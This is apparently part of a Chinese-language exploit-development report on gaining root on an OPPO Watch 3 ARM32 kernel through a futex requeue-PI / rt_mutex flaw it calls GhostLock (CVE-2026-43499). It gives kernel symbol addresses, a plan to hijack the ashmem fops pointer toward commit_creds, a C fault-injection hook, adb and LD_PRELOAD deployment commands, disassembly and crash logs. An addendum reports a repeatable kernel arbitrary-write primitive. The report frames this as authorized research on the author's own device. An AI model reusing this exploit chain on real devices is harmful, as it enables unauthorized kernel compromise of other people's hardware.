### 8.3 `rt_mutex_enqueue`（`c0197ae8`）与"强制走右"

走链把 requeue 出来的**栈 waiter**（其 prio 刚被写成 `task->prio`，clamp punch 下为 120…139）插入 `fake_lock->waiters`，比较式为 `waiter->prio < node->prio`（`c0197b1c cmp r5,r2 / movwlt r7,#1`）。把 `fake_w0->prio` 植为 **0** 后，"任何值都小于 0"恒不成立 ⇒ 恒走 **右** 子，`rb_insert_color_cached(..., leftmost=false)`，`rb_leftmost` 仍是 `fake_w0`。这一步同时保证了：(a) 不会把栈 waiter 变成 top waiter；(b) `[9]` 之后的 `wake_up_process()` 分支被绕开，伪造的 `waiter->task` 永不被解引用——在 `CONFIG_CPU_SW_DOMAIN_PAN=y` 下这点是硬要求，而把 task 植为页内 `fake_task` 则是第二重保险。

`fake_w0->tree_entry.parent_color = 1`（BLACK、parent NULL）使 `__rb_insert` 第一次循环即 `break`，不触碰任何父/祖指针——这是参考实现中一处极易写错的位（`RB_RED=0 / RB_BLACK=1`），也是本研究早期一批失败的直接原因（任务 #9 的修复项）。

### 8.4 hijack 目标与两阶段写

真正的分派槽位是 `struct miscdevice.fops`，因为 `drivers/char/misc.c: misc_open()` 执行 `new_fops = fops_get(minor_data->fops); file->f_op = new_fops;`；改 `ashmem_fops` 自身的 `owner` 字段不影响任何分派。离线映射给出：

```
c1aa8808 d ashmem_misc         → offsetof(fops) = 8  → W = 0xc1aa8810
c13ae0c8 d ashmem_fops
c1a08a04 d sysctl_optmem_max   （oracle 槽位）
c1a1d174 d console_printk      （备选 oracle 槽位）
```

（`target.h` 内一处旧注释把 `ashmem_misc` 记作 `c1aa8750`，与设备自抽取映射不符；以 `System.map.fixed` 与运行时日志 `write_target=c1aa8810` 为准。`SYSCTL_OPTMEM_MAX` 同理：注释中的 `c1a08934` 陈旧，烘焙值 `c1a08a04` 与实机日志一致。）

* **phase 0**：`W = 目标槽位`，`V = fake_fops`。落地后 `*(W) = fake_fops`，`rb_erase` 的第二写 `*(V) = W − 4` 落在 `fake_fops` 处（页内，可接受）。
* **phase 1**：`W = fake_fops`，`V = 0`（把 `fops->owner` 归零，避免后续 `fops_get/put` 依赖 owner 模块引用计数）。
  注意 phase 0 的第二写 `*(V) = W−4` 恰好把 `fake_fops->owner` 写成 `W−4`（一个伪模块指针），因此 **phase 1 必须在任何 `open("/dev/ashmem")` 之前完成**，否则 `misc_open()` 里的 `try_module_get(fops->owner)` 会直接解引用野指针。顺序为：phase 0 → phase 1 → 读回验证 → 打开设备。`V = 0` 时 `rb_erase` 的 `if (child)` 分支不执行，故 phase 1 只有一处写、天然干净。
* **验证**：oracle 模式下读回 `/proc/sys/net/core/optmem_max`。SELinux 在本构建下拒绝 shell 访问 `/proc/sys/kernel/*` 与 `/proc/sys/vm/*`（已实测 printk/panic/kptr_restrict 均 Permission denied），但**允许** `/proc/sys/net/core/*`，故 `optmem_max` 是唯一既有正向读回、又因只影响 per-socket option memory 而归零也不会挂机的槽位。

日志（oracle fire，展示 `W` 确实为 optmem 地址、`V` 为页内 fops 表）：

```
[15:56:47.940] WS a=1 ph=0 wbase=4 W=c1a08a04 V=da3a6a00 page=da3a6000
              fops=da3a6a00 lock=da3a6700 plant=c1a08a00 da3a6a00 00000000 da3a6700 00000000
```

---

## 9 失败模式与观测方法学

### 9.1 "挂死"与"Oops"的判别法

本平台关闭了 `LOCKUP_DETECTOR`/`SOFTLOCKUP_DETECTOR`/`HUNG_TASK`/`PSTORE_CONSOLE`，但 `CONFIG_PSTORE=y` + `PSTORE_RAM` 与 `QCOM_WATCHDOG_BARK_TIME=15000` 共同给出一个干净的二分法：

| 现象 | Oops（含 `udf`/NULL/对齐/野指针） | 静默挂死 |
|---|---|---|
| ramoops `dmesg-ramoops-0` | 必然新增完整记录（`in_atomic` → panic → 落盘） | **内容逐字节不变** |
| `dumpsys dropbox` | 有 `SYSTEM_LAST_KMSG` | 无 |
| 复位时刻 | 故障即刻 | 约 15 s 后（看门狗 bark） |
| pstore 权限 | `ls /sys/fs/pstore/` 为 EACCES，但 `cat dmesg-ramoops-0` 可读（0444），grep 需 `-a` | 同 |

实验证据（4 次 fire 的 pstore 文件 md5）：

```
572d092911179cae86b30e22e42513d8  wspat-post-pstore.txt   (r5=0x12c 的记录)
572d092911179cae86b30e22e42513d8  wsself-pre-pstore.txt
572d092911179cae86b30e22e42513d8  wsself-post-pstore.txt  ← 与 pre 相同 ⇒ wsself 未产生新 Oops
572d092911179cae86b30e22e42513d8  wsor2-pre-pstore.txt
572d092911179cae86b30e22e42513d8  wsor2-post-pstore.txt   ← 同上 ⇒ wsor2 也是挂死
e1393046fc41ee0f61f58c52c163fe9c  wsora-post-pstore.txt   (r5=2 的对齐陷阱记录)
e1393046fc41ee0f61f58c52c163fe9c  wspat-pre-pstore.txt
```

### 9.2 实验记录矩阵

| 实验标签 | 关键配置 | 观测 | 判读 |
|---|---|---|---|
| `f120gap` / `nocust` / `fillauto`（早期） | pselect 向量、prio 填充/区间探针 | 结果不可判读（当时尚无几何指纹） | 促成 §7 指纹探针的设计 |
| `wsora` | walksafe，`WS_TARGET=oracle`，旧构建 | Oops：`_raw_spin_trylock` 对齐陷阱，`r5=2`，`r6=c4b25ec0` | 植物未覆盖 `waiter->lock`（旧构建新鲜度问题） |
| `wspat` | `GHOSTLOCK_PATTERN=1`（指纹） | Oops：`NULL deref @0x12c`，`r5=0x12c`，`r6=c7e19ec0` | **`W_BASE=4` 实测成立；走链抵达 [5]；写窗口内容可控** |
| `wsor2` | walksafe + oracle，`W_BASE=4` | 日志止于 `PUNCH-TGT`，15 s 复位，pstore 不变 | 走链启动后**挂死** |
| `wsself` | walksafe + `WS_TARGET=self`（两写都落自家页内） | 同上，挂死 | 挂死与**写目标无关** ⇒ 根因在走链机制内部 |
| `punchself` / `punchowner` / `ctl-esrch` | punch 判别组 | 见 §9.3 | 排除 punch 目标因素 |

`WS_TARGET=self` 这一组尤其关键：它把 `W`、`V` 都指向自家受控页（`W = c4344e00`，`V = c4344e08`），即使写成功也只破坏我们自己的数据；实机表现仍是挂死。因此**"瞄准错误"被排除**，问题必然位于走链自身的执行流。

### 9.3 主假说：trylock 失败后的无穷重试

`c0196d68 bl _raw_spin_trylock` 失败时（返回 0），控制流走 `c0196d74`：`_raw_spin_unlock_irq(&task->pi_lock)`、`_raw_spin_lock_irq(&task->pi_lock)` 重取、重读 `task->pi_blocked_on`，若非 NULL 则 `bne c0196cb4` **直接 goto retry**。由于 `pi_blocked_on` 在我方场景中始终非 NULL（幽灵正是靠它存在），且重试时 trylock 的目标仍是 `fake_lock.wait_lock`，只要该字**非 0**，这段循环就永不退出：

```
c0196d74  mov r0, r7              ; &task->pi_lock  (= task + 0x6b4)
c0196d78  bl 0xc0faed30           ; _raw_spin_unlock_irq(&task->pi_lock)
c0196d7c  mov r0, r7
c0196d80  bl 0xc0faebd4           ; _raw_spin_lock_irq(&task->pi_lock)
c0196d84  ldr r6, [r4, #0x6c8]    ; waiter = task->pi_blocked_on —— 仍非 NULL
c0196d8c  bne 0xc0196cb4          ; goto retry —— 无退避计数、无超时
```

在 8 核 SMP 上这会造成一次"占住一个 CPU 的死循环 + 反复抢占 pi_lock"的静默系统级卡顿：没有 softlockup 检测器去打印它，15 s 后 SoC 看门狗复位，pstore 里一行都不多。这与 `wsself`/`wsor2` 的全部观测（日志停在 `PUNCH-TGT`、15 s 复位、pstore md5 不变）**完全一致**。

而 `fake_lock.wait_lock` 为 0 是 §4.1 的页构建明确写入的（`put32(p, LOCK_OFF + 0x00, 0)`）。因此若假说成立，唯一自然解释是：**punch 时刻该页已经不是我们的页**——泄露对象所在 slab 在 `PREP`（t≈40.4 s）与 punch（t≈48.6 s）之间约 8 s 的间隔中被内核回收/复用（手表上系统服务活跃、内存压力波动），页上恰好是一个"已占用自旋锁 ≠ 0"的真实数据。这也与另一条独立记忆相符（order-3/页大小曾被误设，`mm` 实为 order-0）。

### 9.4 备择假说

* **H2**：trylock 成功，但厂商在 `c0196dc4` 之后（`udf` 加固、`c019718c/94`）加入了主线 5.4 没有的检查，触发了一次不可打印的死锁式等待。
* **H3**：走链之后的 `rt_mutex_setprio` 路径进入 `__task_rq_lock`，因 `fake_task` 的某些字段（`on_rq`、`sched_class`）被真实调度器读到而阻塞 rq 锁。当前 owner=0 应在 `[9]` 退出，理论上不触及；但 `str r6,[r6]`（RB_CLEAR）与 prio 回写会破坏栈上 waiter，若走链被重试多次，可能形成不一致状态。
* **H4**：死循环发生在轮询线程自身（`clock_adjtime` 快速返回，正常），已被"同一次 fire 中 `WS`/`PRE-ATDFI`/`PUNCH-TGT` 三行全部打印"排除到 punch 之后。

---

## 10 下一步：毒字阶梯（poison ladder）单步故障定位

### 10.1 设计思想

既然挂死没有日志，就把"没有日志"变成可判定信号：**每次只把页内一个关键字写成非法/未对齐值，让走链在真正经过该字段时必然产生带 PC 的 Oops**。若某次 fire 变成干净的 Oops，则证明（a）页内容确实是我们在 punch 时刻写入的，（b）走链确实抵达了读取该字段的步骤；若仍然挂死，则该字段在此之前就未被读取，或页已被回收。这等价于一台"单步调试器"，每一步只消耗一次可控重启。

```
rung 1 : GHOSTLOCK_PAGE_POISON="700,1"   ; fake_lock.wait_lock := 1（未对齐）
         → 若 Oops @ _raw_spin_trylock：页是我们的、植物是活的、走链抵达 [5]；
           则此前所有挂死意味着 trylock 成功并且走链继续（问题在 [5] 之后 → rung 2/3）
         → 若仍然挂死：页在 punch 时刻已不是我们的（H1 成立 → 改为"紧贴 PREP 立刻 punch"
           或"punch 前重喷页"）
rung 2 : GHOSTLOCK_PAGE_POISON="61c,3"   ; fake_w0.lock := 3（未对齐且非 fake_lock）
         → Oops @ c0196dc4 的 ldr：证明走链过了 [5]、进入 top_waiter 校验
rung 3 : 依次对 W0 的 pi_tree 字、fake_task->pi_waiters、task->stack 目标字做同样处理
```

实现只需在 `exploit/src/util.c` 的页构建循环末尾加一个钩子（`put_fake_fops_table()` 之后、循环闭合之前）：

```c
/* 每次 fire 只毒一个字：把 "偏移,值" 覆盖到每个喷出的页上。
 * 目的是把"静默挂死"转成"带 PC 的 Oops"，从而给走链做单步定位。 */
{
  const char *ps = getenv("GHOSTLOCK_PAGE_POISON");
  if (ps && *ps) {
    unsigned long po = strtoul(ps, nullptr, 16), pv = 0;
    const char *cm = strchr(ps, ',');
    if (cm) pv = strtoul(cm + 1, nullptr, 16);
    if (po < ORDER3_SIZE) put32(p, (size_t)po, (uint32_t)pv);
  }
}
```

（截至本报告撰写，该钩子尚未编译进设备上的构建；构建产物为 419788 字节、md5 `370ed5ea93d6e98b3a31f89b83a196f5`，`push` 后设备侧 md5 校验一致。）

### 10.2 判读矩阵

| rung | 现象 | 结论 |
|---|---|---|
| 1（毒 `wait_lock`） | Oops @ `_raw_spin_trylock`（PC `c0faea40/44`） | 页内容可控、走链达 [5]；挂死原因在 [5] **之后** |
| 1 | 仍挂死（pstore md5 不变） | 页在 punch 时已失主 ⇒ 缩短 PREP→punch 间隔或 punch 前重喷 |
| 2（毒 `fake_w0->lock`） | Oops @ `c0196dc4` | 走链越过 [5]，进入 top_waiter 校验 |
| 2 | 仍挂死 | 挂死点位于 `c0196d94..c0196dc4` 之间（EDEADLK 判定/`udf`） |
| 任意 | `optmem_max` 读回 == `fake_fops` | **单次可控写落地成功**（正向验证，非"没崩"推断） |

### 10.3 root 成功判据（不变）

1. 设备不复位、日志走到 `WS-DONE ... verdict=EXACT-HIT`；
2. `cat /proc/sys/net/core/optmem_max` 精确等于 `fake_fops` 地址（oracle 阶段）；
3. phase 1 归零 `fops->owner` 后 `try_cfi_stage()` 执行，`open("/dev/ashmem")` 跳入我方表；
4. `id -u` 返回 `0`，且全程未触碰 bootloader。

---

## 11 风险与替代路线评估

* **硬件风险**：当前所有失败都表现为重启；Bootloader 未被触碰，不存在变砖路径。每次失败 fire 的时间成本约 40 s（含 ADB 重连与 pstore 采集）。
* **稳定性代价**：走链死循环会短时占住 CPU 与 pi_lock，在手表上偶发伴随其他任务被拖慢；已确认无持久损坏（重启后系统正常、用户数据完好）。
* **被排除的路线**（记录以免重复劳动）：（a）无符号的运行时 `pipe.c` mem_map 引导——被设备所有者明确否决；（b）任何依赖解锁 bootloader 的镜像刷写；（c）使用 A.90 等异版本 blob 的符号；（d）把用户态地址直接当作伪造内核指针（`CPU_SW_DOMAIN_PAN` 阻断）。
* **备选提权面**（本研究之外的候选）：`udf` 加固显示该 vendor 内核在 PI 路径上有主动断言，提示其调度/锁子系统可能还有别的检查点可用作信标；若单次写最终无法在走链内落地，`sched_setattr` + uCLAMP 与 `memfd`/`ashmem` 组合仍提供其他可写的内核对象窗口。

---

## 12 结论

本研究把 GhostLock（CVE-2026-43499）在 OPPO Watch 3 / OWW212 这一 ARM32 无 KASLR 内核上的**可达性链条完整打通并逐环实证**：符号重建（三方一致）→ `mm_struct` 泄露（`HIT model=1 hsz=256`）→ 幽灵 waiter 形成（`REQUEUE-PI ret=-1 errno=35`）→ 写窗口命中与几何确定（指纹探针，`W_BASE=4`，`ghost = stack_top − 320`）→ 走链启动并抵达 `waiter->lock` 的 trylock（两次独立 Oops 的 PC/LR 相同）→ 指令级走链建模与安全页设计（owner=0 在 `[9]` 退出、prio=0 强制右行、`pc=1` 阻断重平衡、`lock=fake_lock` 绕开厂商 `udf`）。

**尚未成功的部分是最后一公里**：当 `waiter->lock` 被植为我方页内合法地址后，实机表现为 15 s 无日志硬复位而非预期的"干净返回 0 + 一次可控写"。该现象已被实验收窄为与写目标无关（`self`/`oracle` 皆挂），主假说是 `wait_lock` 在 punch 时刻非 0（页回收）导致 `cpu_relax(); goto retry;` 死循环。§10 给出的毒字阶梯是一次即可判读该假说的最小实验，且失败成本仅为一次重启。

对设备所有者而言，可执行的结论是：**技术路线成立、边界安全（不动 bootloader）、根因已定位到单一可判定的二分点，下一步实验无需新工具链。**

---

## 13 伦理与合规声明

本工作全部在作者自有、明确授权的单一台设备上完成，目的为评估厂商内核安全更新滞后的实际风险。所有探针均选择"最坏退化为一次重启"的构造；不使用、不外传任何用户数据；不绕过或修改设备锁、签名验证与 Bootloader 状态；相关漏洞信息以公开渠道已披露的 CVE 为边界。建议厂商侧修复方式为 backport 主线对应错误路径上 `pi_blocked_on` 的清理（在 requeue/EDEADLK 早退处对发起方与阻塞方同时清链），并在厂商加固中对该路径补充断言。

---

## 参考文献

1. Linux 内核主线 `kernel/locking/rtmutex.c`、`kernel/futex/requeue.c`、`kernel/sched/core.c`（5.4.134 本地副本：`linux-5.4/`）。
2. CVE-2026-43499（GhostLock）公开披露与 ARM64/4.14 参考 PoC 仓库；OPPO 平台移植仓库 `ReBiliBin/ghostlock-oppo-watch3pro`（本报告以实机数据评估其结论）。
3. `include/linux/rbtree_augmented.h`（`RB_RED=0 / RB_BLACK=1`）、`lib/rbtree.c`（`__rb_insert`、`rb_erase` 语义）。
4. `drivers/char/misc.c:misc_open()`（`minor_data->fops` 为真实分派槽位）。
5. Android `ashmem` driver（`drivers/staging/android/ashmem.c`）。
6. KernelSnitch（`mm_struct` 泄露 via hsearch 碰撞）技术描述。
7. Qualcomm SMD/SoC watchdog 驱动与 `CONFIG_QCOM_WATCHDOG_BARK_TIME` 行为。
8. ColorOS OTA 接口（`iota.coloros.com`）固件获取记录（本地：`ota-research/OTA获取记录.md`）。

---

## 附录 A：关键符号（设备自抽取 kallsyms，`System.map.fixed`）

| 符号 | 运行时地址 | `target.h` 烘焙 OFF | 校验 |
|---|---|---|---|
| `commit_creds` | `c0148c60` | `0x00140c60` | ✅ |
| `prepare_kernel_cred` | `c0148fe4` | `0x00140fe4` | ✅ |
| `init_task` | `c1a112c0` | `0x01a092c0` | ✅（与日志 `init_task=c1a112c0` 一致） |
| `rt_mutex_adjust_pi` | `c0196ba4` | — | 反汇编核对 |
| `rt_mutex_adjust_prio_chain` | `c0196c4c` | — | ✅（`LR=c0196d6c` = +0x120） |
| `rt_mutex_enqueue` | `c0197ae8` | — | 全量反汇编核对 |
| `sys_clock_adjtime` | `c01d34a4` | — | 帧深度 248，`ktx @ sp+0` |
| `futex_requeue` / `futex_lock_pi` | `c01dd944` / `c01de400` | `0x001d5944` / `0x001d6400` | ✅ |
| `_raw_spin_trylock` | `c0faea20` | — | Oops PC 核对 |
| `ashmem_misc` | `c1aa8808` | `0x01aa0808` | ✅ → hijack 槽 `c1aa8810` |
| `ashmem_fops` | `c13ae0c8` | `0x013a60c8` | ✅ |
| `misc_fops` | `c136d910` | — | 参考 |
| `sysctl_optmem_max` | `c1a08a04` | `0x01a00a04` | ✅（旧注释 `c1a08934` 作废） |
| `console_printk` | `c1a1d174` | `0x01a15174` | ✅（旧注释 `c1a1d0ac` 作废） |
| `wake_up_process` | `c01537f0` | — | 设计为不可达 |

实测结构偏移更正：`task->pi_lock = 0x6b4`，`task->pi_blocked_on = 0x6c8`（旧 ARM64 推导 0x570/0x584 作废）。

## 附录 B：复现环境与命令

```bash
# 交叉编译（Windows 侧 NDK r29，Git Bash）
bash build_arm32.sh            # → exploit/preload.so（当前 419788 字节）

# 部署（必须设置 MSYS_NO_PATHCONV，否则远端路径被改写）
export MSYS_NO_PATHCONV=1
/c/platform-tools/adb.exe push exploit/preload.so /data/local/tmp/preload.so
/c/platform-tools/adb.exe shell md5sum /data/local/tmp/preload.so   # 与本地一致

# 设备侧启动器 /data/local/tmp/fire.sh
export LD_PRELOAD=/data/local/tmp/preload.so
exec /system/bin/toybox true

# 受控单发 + 分类采集（pstore pre/post、optmem 前后、日志摘要）
bash atd_fire.sh <label> <ENV...>
# 例：指纹实验（本报告 §7 的数据来源；日志中该 fire 显示 wbase=0、pattern 生效）
bash atd_fire.sh wspat GHOSTLOCK_PATTERN=1 GHOSTLOCK_WBASE=0 GHOSTLOCK_ATTEMPTS=1
# 例：写目标自瞄（§9.2 的 wsself 组）
bash atd_fire.sh wsself GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_WS_TARGET=self GHOSTLOCK_WS_PHASES=1 \
     GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=1
```

环境变量表（与本实验相关）：

| 变量 | 含义 |
|---|---|
| `GHOSTLOCK_WBASE` | 植字基址偏移（实测正确值 = 4） |
| `GHOSTLOCK_WALKSAFE` | 启用安全页植字（owner=0、prio=0、pi_tree 清零） |
| `GHOSTLOCK_WS_TARGET` | `self` / `oracle` / `fops` 三选一 |
| `GHOSTLOCK_WS_PHASES` | 阶段数（1 = 只验证单次写；2 = 写 + 归零 owner） |
| `GHOSTLOCK_PATTERN` | 指纹探针 `buf[w] = 0x100 + 4w` |
| `GHOSTLOCK_ATTEMPTS` | 每次 fire 的 punch 次数 |
| `GHOSTLOCK_PUNCH_TID=-1` | 装而不发（`-ESRCH`，在任何 pi_lock 之前返回）——负对照组 |
| `GHOSTLOCK_PUNCH_TARGET` | `self` / `owner` / `waiter` 判别组 |
| `GHOSTLOCK_PRIO_FILL` / `GHOSTLOCK_PRIO_PLANT` | 窗口/按基址 bail 二值探针（非破坏性） |
| `GHOSTLOCK_PAGE_POISON` | §10 的毒字阶梯（偏移,值）——**待实现** |
| ~~`GHOSTLOCK_STACK_PAD`~~ | **已作废**：用户态 alloca 不影响内核帧 |

## 附录 C：关键反汇编片段（A.142，实测）

以下全部由 `python exploit/tools/armimg.py dis <addr> <n>`（capstone，镜像 `ota-research/extracted_a142/Image.a142`，BASE `0xC0008000`）在设备自有内核镜像上直接反汇编取得，非主线源码推断。

```
; ---- rt_mutex_adjust_prio_chain（c0196c4c，尺寸 0x558）：+0xC8 .. +0x25C ----
c0196d14  ldr  r1, [r4, #0x34]        ; task->prio
c0196d18  ldr  r0, [r6, #0x20]        ; waiter->prio
c0196d1c  cmp  r0, r1
c0196d20  bne  #0xc0196d64            ; 不等 => 继续走链（我方植 prio=0 必走此支）
...
c0196d64  mov  r0, r5                 ; r0 = waiter->lock
c0196d68  bl   #0xc0faea20            ; _raw_spin_trylock
c0196d6c  cmp  r0, #0
c0196d70  bne  #0xc0196d94            ; 成功 => 正常路径
c0196d74  mov  r0, r7                 ; ---- 失败分支（死循环风险）----
c0196d78  bl   #0xc0faed30            ;   _raw_spin_unlock_irq(&task->pi_lock)
c0196d7c  mov  r0, r7
c0196d80  bl   #0xc0faebd4            ;   _raw_spin_lock_irq(&task->pi_lock)
c0196d84  ldr  r6, [r4, #0x6c8]       ;   waiter = task->pi_blocked_on  (0x6c8 实测)
c0196d88  cmp  r6, #0
c0196d8c  bne  #0xc0196cb4            ;   goto retry  —— 无退避、无超时
c0196d90  b    #0xc0197118
c0196d94  ldr  r0, [sp, #8]           ; orig_lock (NULL)
c0196d98  ldr  sl, [sp, #0x34]        ; top_task
c0196d9c  cmp  r5, r0
c0196da0  ldrne r0, [r5, #0xc]        ; next_lock->owner
c0196da4  bicne r0, r0, #1            ; 去掉 tag 位
c0196da8  cmpne r0, sl
c0196dac  beq  #0xc019710c            ;   EDEADLK
c0196db0  tst  r8, #1                 ; requeue ?
c0196db4  beq  #0xc0196dd8            ;   否 => 跳过 dequeue（r8=1 实测，故走"是"）
c0196db8  ldr  r0, [r5, #8]           ; top_waiter = lock->waiters.rb_leftmost
c0196dbc  cmp  r0, #0
c0196dc0  beq  #0xc0196e74            ;   树空 => sl=0
c0196dc4  ldr  r1, [r0, #0x1c]        ; top_waiter->lock
c0196dc8  mov  sl, r0                 ; prerequeue_top_waiter = top_waiter
c0196dcc  cmp  r1, r5                 ; 厂商加固：必须等于 next_lock
c0196dd0  beq  #0xc0196e78            ;   相等 => 安全；否则 b #0xc019718c（udf）
c0196e78  ldr  r1, [r6]              ; RB_EMPTY_NODE: waiter->tree_entry.pc
c0196e7c  cmp  r1, r6
c0196e80  beq  #0xc0196ea4            ;   已自清 => 跳过 dequeue
c0196e84  cmp  r0, r6                 ; top_waiter == waiter ?
c0196e88  bne  #0xc0196e94
c0196e8c  bl   #0xc0f9b468            ;   rb_next(waiter)
c0196e90  str  r0, [r5, #8]           ;   更新 rb_leftmost
c0196e94  add  r1, r5, #4             ; rb_erase_cached: root = &lock->waiters.rb_root
c0196e98  mov  r0, r6                 ;   node = waiter（栈上的幽灵！）
c0196e9c  bl   #0xc0f9af3c            ;   ==> rb_erase：唯一的 "写 where" 来源
c0196ea0  str  r6, [r6]               ; RB_CLEAR_NODE（写 ghost+0 = ghost，无害）
c0196ea4  ldr  r0, [r4, #0x34]        ; task->prio
c0196ea8  str  r0, [r6, #0x20]        ; waiter->prio = task->prio（回写幽灵）

; ---- _raw_spin_trylock（Oops PC 落点）----
c0faea20  push {r4, lr}
c0faea24  mov  r1, #4
c0faea28  mov  r2, sp
c0faea2c  bfi  r2, r1, #0, #0xd
c0faea30  ldr  r1, [r2]
c0faea34  add  r1, r1, #1
c0faea38  str  r1, [r2]
c0faea3c  pldw [r0]
c0faea40  ldrex r2, [r0]              ; Oops #1 停在 +0x20；Oops #2 停在 +0x24（对齐陷阱）
c0faea44  mov  r3, #0
c0faea48  subs r1, r2, r2, ror #16
c0faea4c  addeq r2, r2, #0x10000
c0faea50  strexeq r3, r2, [r0]
c0faea54  cmp  r3, #0
```

## 附录 D：完整 ramoops 摘录（§7.2 指纹实验，逐字节原样）

```
<1>[  827.728846] 8<--- cut here ---
<1>[  827.728855] Unable to handle kernel NULL pointer dereference at virtual address 0000012c
<1>[  827.728860] pgd = 3682de94
<1>[  827.728863] [0000012c] *pgd=00000000
<0>[  827.728871] Internal error: Oops: 5 [#1] PREEMPT SMP ARM
<4>[  827.728915] CPU: 1 PID: 8370 Comm: toybox Tainted: G        W  O      5.4.134-perf-00522-gb29f81177a79 #1
<4>[  827.728918] Hardware name: Qualcomm Technologies, Inc. MONACO (Flattened Device Tree)
<4>[  827.728928] PC is at _raw_spin_trylock+0x20/0x90
<4>[  827.728935] LR is at rt_mutex_adjust_prio_chain+0x120/0x558
<4>[  827.728939] pc : [<c0faea40>]    lr : [<c0196d6c>]    psr: 20010093
<4>[  827.728942] sp : c7c15e90  ip : 000f000f  fp : 00000000
<4>[  827.728945] r10: 00000000  r9 : 00000000  r8 : 00000001
<4>[  827.728949] r7 : e1ff96b4  r6 : c7e19ec0  r5 : 0000012c  r4 : e1ff9000
<4>[  827.728953] r3 : 00000000  r2 : c7c14004  r1 : 00000003  r0 : 0000012c
<4>[  827.728958] Flags: nzCv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment none
<4>[  827.728962] Control: 10c0383d  Table: 44d5c06a  DAC: 00000051
<0>[  827.728966] Process toybox (pid: 8370, stack limit = 0x3c6012cd)
```

寄存器直读：`r4 = task = 0xe1ff9000`；`r7 = task + 0x6b4 = &task->pi_lock`；`r6 = waiter = 0xc7e19ec0`（= 该线程 `stack_top − 0x140`）；`r5 = waiter->lock = 0x12c = buf[11]`（指纹值）；`r8 = 1 = requeue`。

## 附录 E：单次成功 fire 的时间线（实测，walksafe 阶段）

```
t+0.00s  preload 启动，uid=2000 / SELinux shell 域确认
t+0.33s  KernelSnitch 参数（cpu 8, mm 0x200, order 0）
t+0.83s  哈希碰撞发现（3 处）
t+2.57s  mm_struct 泄露命中（model=1 hsz=256）→ PREP 页就绪
t+2.71s  CONSUMER-START（线程绑核成功与否记录 pin_rc/pin_errno）
t+2.81s  REQUEUE-PI ret=-1 errno=35 → 幽灵 waiter 成形
t+10.7s  TARGET-PRE（punch 目标 prio=120）
t+10.75s WS ph=0 植字（W/V/page/lock/fops 全部打印，供事后核对）
t+10.76s PRE-ATDFI（buf[4..12] 内容逐字打印）
t+10.77s PUNCH-TGT → 此后进入走链（当前在此挂死）
```

`t+2.81 → t+10.7` 的约 8 s 间隔正是 §9.3 假说关注的"页可能失主"窗口，也是下一步实验要压缩的对象。

---

# 追加章节（2026-10-16）：任意写落地、可重复化，以及一条被证明走不通的路

本报告正文写于 2026-10-14，当时的判断（"走链挂死、根因疑为页回收"）在随后的实验中被**部分推翻、部分精化**。以下追加内容为最新实测结论，正文中与之冲突之处以本追加章节为准。

## A1 任意写原语已在实机落地并可重复

| 实验 | 配置 | 结果 |
|---|---|---|
| `wdt1` | `WS_DATA=1 WS_TARGET=oracle WBASE=4 ATTEMPTS=1` | `optmem_max` 读回 `0xc1d511d4`（= 我们指定的值），`verdict=EXACT-HIT`，**设备存活**，punch 23 µs |
| `wdt2` | 同上 + `WS_PUNCHES=400` | 第 2 次 punch 死在 `rb_insert_color`（`LR=rt_mutex_adjust_prio_chain+0x278`，`r1=c1d510d8`=`L+4`） |
| `wdt3` | 同上 + **假树旋转** | `calls=16 success=16 avg_usec=10`，`EXACT-HIT`，**设备存活** ⇒ 每次开机可下 64 次任意写 |

**关键设计：把走链要解引用的结构从"回收页"搬到编译期已知的零 .bss 缓冲区。**

```c
/* target.h */
#define DBGFS_TX_CMD_BUF_OFF 0x01d48fd4UL          /* c1d50fd4, 'b', 恰好 0x1000 字节 */
#define DBGFS_TX_CMD_BUF     (KIMAGE_TEXT_BASE + DBGFS_TX_CMD_BUF_OFF)
#define FAKE_LOCK_DATA_OFF   0x100                 /* 假 rt_mutex */
#define FAKE_ABSORB_DATA_OFF 0x200                 /* 吸收 *(V)=W-4 的槽位 */
```

选它的理由：`dbgfs_tx_cmd_buf` 在 `.bss`（启动即为全 0 ✓）、下一个符号 `dsi_display_primary` 正好在 `+0x1000`（大小确定 ✓）、只有 root 才能碰的 DSI debugfs store 处理函数会写它（shell 无法干扰 ✓）、且**地址是编译期常量**（无 KASLR ✓）。这样走链解引用的每一个地址都是常量，**对"页回收成功"的依赖被彻底删除**。

`wdt2` 的崩溃也顺带证明了为什么必须旋转：第 1 次 punch 之后 `L->waiters.rb_node/rb_leftmost` 仍指向栈上的幽灵，第 2 次 punch 的 `rt_mutex_enqueue` 会顺着这条陈旧链走。修法是每次 punch 前把 `adjbuf[wbase+WT_W_LOCK]` 推进 16 字节，取一块全新的零假树：

```c
if (ws && ws_data_mode()) {
  unsigned int n = (unsigned)atomic_load(&consumer_success) & 63u;
  adjbuf[wbase + WT_W_LOCK] = (uint32_t)(ws_lock_addr() + (uintptr_t)(n * 0x10));
}
```

这只是对用户态缓冲区做一次普通 store，不引入任何系统调用，所以"植物新鲜度"仍然由每 ~0.3 µs 一次的 `copy_from_user` 保证。

## A2 正文 §9.3 的"页回收"假说：真正的原因更基础

正文猜测是"PREP 与 punch 之间 8 s 内页被回收"。实测把这条推进了两步：

1. **`wr1` 指纹实验证明栈上的植物是活的**：故意把 `waiter->lock` 植成 `fake_lock+1`（未对齐），内核立刻死在 `_raw_spin_trylock+0x24`，`r0 = c6903701` = 我们写进去的值，调用链 `sys_sched_setattr → __sched_setscheduler → rt_mutex_adjust_pi → rt_mutex_adjust_prio_chain → _raw_spin_trylock` 完整可见。**几何与植物活性从此不再是疑问。**
2. **`wspo7` 给出了决定性证据**：崩溃是 **`Unable to handle kernel paging request at virtual address d1a2c700`**（页根本不存在），而不是内容错误。查设备自身启动 dmesg（保存在 pstore）发现：

```
lowmem  0xc0000000-0xc5a00000 (90 MB)   vmalloc 0xc5a00000-0xc5f10000 (5 MB)
lowmem  0xc5f10000-0xc5fff000           lowmem  0xc6300000-0xcab00000 (72 MB)
vmalloc 0xcab00000-0xcfb00000 (80 MB)   lowmem  0xcfb00000-0xd0900000 (14 MB)
vmalloc 0xd0900000-0xd2717000 (30 MB)   lowmem  0xd2717000-0xe0000000 (216 MB)
```

**这台机器的低段直接映射被设备树空洞切成多段，vmalloc 夹在中间**；而 KernelSnitch 的扫描范围写的是 `0xC0000000-0xF0000000`，于是会把 **vmalloc 空洞里的地址当成 mm 页**返回。`d1a2c000`、`d2cd7000` 等"命中"全都落在空洞里。已加 `__ks_addr_is_lowmem()` 白名单修掉。

